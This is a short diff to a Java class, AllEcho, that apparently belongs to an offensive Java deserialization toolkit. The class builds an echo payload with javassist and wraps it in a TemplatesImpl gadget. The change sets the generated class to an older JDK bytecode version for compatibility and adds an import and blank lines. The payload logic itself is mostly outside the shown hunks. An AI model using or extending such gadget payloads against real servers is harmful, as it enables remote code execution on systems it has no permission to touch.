@@ -5,6 +5,8 @@ package com.summersec.attack.deser.echo;
 import com.summersec.attack.deser.util.Gadgets;
 import javassist.*;
 
+import java.io.*;
+
 
 public class AllEcho implements EchoPayload {
 
@@ -101,7 +103,8 @@ public class AllEcho implements EchoPayload {
                 "        );}");
 
         clazz.addConstructor(CtNewConstructor.make("public dfs(){       r = null;        p = null;        h =new java.util.HashSet/*<Object>*/();        F(Thread.currentThread(),0);    }",clazz));
-
+        // 兼容低版本jdk
+        clazz.getClassFile().setMajorVersion(50);
 
         return clazz;
     }
@@ -109,6 +112,9 @@ public class AllEcho implements EchoPayload {
     public static void main(String[] args) throws Exception {
 //        String echoOpt;
         Object template = Gadgets.createTemplatesImpl("AllEcho");
+
+
+
     }
 
 }
